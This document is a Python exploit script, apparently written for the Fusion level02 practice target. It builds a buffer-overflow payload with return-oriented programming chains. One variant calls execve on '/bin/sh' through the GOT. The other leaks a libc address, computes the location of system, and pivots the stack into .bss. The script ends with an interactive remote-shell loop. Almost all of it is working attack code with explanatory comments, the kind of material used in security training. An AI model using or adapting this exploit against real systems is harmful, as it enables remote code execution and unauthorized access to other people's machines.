#!/usr/bin/python
import socket
import struct
from time import sleep

def pack_hex(hex_byte_list):
    key = ''
    length = len(hex_byte_list)
    fmt = '>' + str(length) + 'B'
    key = struct.pack(fmt, *hex_byte_list)
    return key

def easy_strategy():
    '''
    got not randomized. jump to read to store execve args and jump to execve.
    '''
    '''
    0
    bss + len(/bin/sh\0)
    bss
    @3pops
    execve_got                                          <-- (3)
    --
    send: pack('/bin/sh\0', 0x0, @/bin/sh, 0x0)         <-- (2)
        fake stack layout
        +-----------+
        | 0x0       | <- env
    +---| @/bin/sh  | <- argv pointer
    |   | 0x0       | <- filler (and also argv[1])
    +-->| /bin/sh\0 | <- progname (and also argv[0])
        +-----------+
    --
    len('/bin/sh') or 1024
    bss
    0
    @3pops
    read_got                                            <-- (1)
    '''
    execve_got = 0x80489b0
    read_got = 0x8048860 # store '/bin/sh' string into .bss section
    bss_section = 0x804b420 + 1024 # writable sect. +1024 4 not breaking things
    pop3ret = 0x80499bd # pop esi; pop edi; pop ebp; ret

    payload = 'A' * ((32*4096) + 16)
    # execute read on server to store data in the .bss section
    payload += struct.pack('<L', read_got)
    payload += struct.pack('<L', pop3ret)
    payload += struct.pack('<L', 0x0)
    payload += struct.pack('<L', bss_section)
    payload += struct.pack('<L', 1024)
    # execute execve with the data stored in the bss section
    payload += struct.pack('<L', execve_got)
    payload += struct.pack('<L', pop3ret)
    payload += struct.pack('<L', bss_section)
    payload += struct.pack('<L', bss_section + len('/bin/sh\0') + 4)
    payload += struct.pack('<L', 0x0)
    return payload

def easy_final_stage(s):
    sleep(0.5)
    # Here we should be stuck in a read triggered by our payload
    # waiting to receive the parameters to be passed to execve
    bss_section = 0x804b420 + 1024
    execve_params = pack_hex([ord(c) for c in '/bin/sh\0'])
    execve_params += struct.pack('<L', 0x0)
    execve_params += struct.pack('<L', bss_section)
    execve_params += struct.pack('<L', 0x0)
    s.send(execve_params)
    shell(s)

def medium_strategy():
    '''
    got not randomized. leak libc base addr through socket write.
    then compute function offset locally relative to libc base.
    '''
    # readelf -r <bin> | grep libc_start_main
    # objdump -R /opt/fusion/bin/level02 | grep libc_start_main
    # NEVER USE (wrong address): objdump -D <bin> | grep libc_start_main
    libc_start_main_got = 0x0804b3d0 # got entry for libc_start_main
    # ldd <bin> // this will give you the libc binary path
    # objdump -T <libc_bin>
    read_got = 0x8048860 # store '/bin/sh' string into .bss section
    write_got = 0x80489c0 # used to send back the libc base
    bss_section = 0x804b420 + 1024 # writable sect. +1024 4 not breaking things
    pop3ret = 0x80499bd # pop esi; pop edi; pop ebp; ret
    # objdump -D <bin> | grep -B 1 "ret" | grep -A 1 "pop" | grep -A 1 "ebp"
    popebpret = 0x8048b13
    # objdump -D <bin> | grep -B 1 "ret" | grep -A 1 "leave"
    leaveret = 0x8048b41

    payload = 'A' * ((32*4096) + 16)
    # leak the libc_start_main real address (server sends it through write)
    payload += struct.pack('<L', write_got)
    payload += struct.pack('<L', pop3ret)
    payload += struct.pack('<L', 0x1)
    payload += struct.pack('<L', libc_start_main_got)
    payload += struct.pack('<L', 0x4)
    # read the second rop stage. system function execution
    payload += struct.pack('<L', read_got)
    payload += struct.pack('<L', pop3ret)
    payload += struct.pack('<L', 0x0)
    payload += struct.pack('<L', bss_section)
    payload += struct.pack('<L', 1024) # rop second stage will be read
    # this stack pivoting is necessary because we have to place a return 
    # address in the stack, but we still do not have the 'system' address.
    # so we return to a pop ebp (ebp will take the bss_section address written
    # in this rop stage) and with the ret  we will jump to the leave;ret.
    # The leave will put ebp in esp (mov esp, ebp; stack is moved to 
    # bss_section) and then (pop ebp) place trash in ebp (from second  rop 
    # stage - remember that now the pop is from the bss_section).
    # Finally, the ret will pop eip the system address placed with the second
    # rop stage.
    payload += struct.pack('<L', popebpret)
    payload += struct.pack('<L', bss_section)
    payload += struct.pack('<L', leaveret)
    # -- end of first stage -- #
    return payload

def medium_final_stage(s):
    sleep(0.5)
    bss_section = 0x804b420 + 1024 # writable sect. +1024 4 not breaking things
    libc_start_main_offset = 0x00019020
    libc_system_offset = 0x0003cb20
    # here we should read the libc_start_main real address
    addr_leak = s.recv(4)
    real_libc_start_main = struct.unpack('<L', addr_leak)[0]
    print('[+] Real libc_start_main: 0x{:02x}'.format(real_libc_start_main))
    # compute the libc base address and the libc system address
    libc_base = real_libc_start_main - libc_start_main_offset
    system = libc_base + libc_system_offset
    print('[+] LIBC base address: 0x{:02x}'.format(libc_base))
    print('[+] system address: 0x{:02x}'.format(system))
    # here we send the parameters for the system call
    payload = struct.pack('<L', 0xdeadbeef) #trash 4 leave from prev rop stage (pop ebp)
    payload += struct.pack('<L', system)
    payload += struct.pack('<L', 0xdeadbeef) # never return here
    payload += struct.pack('<L', bss_section + 16) # addr of /bin/sh string
    payload += pack_hex([ord(c) for c in '/bin/sh\0'])
    payload += struct.pack('<L', 0x0)
    s.send(payload)
    shell(s)

def final_stage(s, strategy='easy'):
    if strategy == 'medium':
        medium_final_stage(s)
    else:
        easy_final_stage(s)

def shell(s):
    print('[**] LAUNCHING SHELL [**]')
    s.settimeout(1)
    while True:
        cmd = raw_input('> ')
        b = s.send(cmd + '\n')
        data = True
        recv_msg = ''
        try:
            while data:
                data = s.recv(1024)
                recv_msg += data
        except socket.timeout: 
            pass
        print("{0}".format(recv_msg))
        if cmd == 'exit':
            return
    s.settimeout(0)

